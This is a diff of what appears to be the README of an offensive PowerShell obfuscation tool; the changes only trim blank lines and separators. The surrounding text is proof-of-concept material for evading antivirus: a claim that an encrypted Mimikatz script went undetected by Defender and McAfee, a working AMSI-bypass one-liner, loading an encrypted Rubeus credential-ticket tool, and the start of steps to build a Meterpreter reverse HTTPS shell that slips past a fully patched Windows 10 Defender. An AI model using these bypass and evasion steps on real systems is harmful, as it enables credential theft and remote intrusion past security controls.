@@ -65,7 +65,6 @@ under certain conditions.
 [*] Writing 'C:\Users\Administrator.PO718687\Desktop\invoke-encryptedm1m1.ps1' ...
 [+] Done!
 
-
 => I scanned the file generated (invoke-encryptedm1m1.ps1) with several antivirus (e.g. Defender, McAfee) and it was not detected.
 
 
@@ -145,7 +144,6 @@ Step 2 - Check that the encrypted 'invoke-rubeus.ps1' is working properly by run
 PS C:\Users\Administrator\Documents\Tools-AD> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 PS C:\Users\Administrator\Documents\Tools-AD> . .\invoke-encryptedRub3u3.ps1
 PS C:\Users\Administrator\Documents\Tools-AD> invoke-rubeus
-
    ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -154,7 +152,6 @@ PS C:\Users\Administrator\Documents\Tools-AD> invoke-rubeus
   |_|   |_|____/|____/|_____)____/(___/
 
   v1.6.4
-
 
  Ticket requests and renewals:
 
@@ -182,9 +179,9 @@ PS C:\Users\Administrator\Documents\Tools-AD> invoke-rubeus
 <SNIP>
 
 
-=================================================================================================================================================================================
+======================================================================================================================================================================
 PoC 3 - Example with a x64 Meterpreter reverse https shell (.ps1) encrypted 2 times and a Windows 10 laptop (fully patched with MS Defender AV enabled and up-to-date)
-=================================================================================================================================================================================
+======================================================================================================================================================================
 
 Step 1 - Generate a x64 Meterpreter reverse https shell in PowerShell format with the option 'psh-reflection'
 --------------------------------------------------------------------------------------------------------------
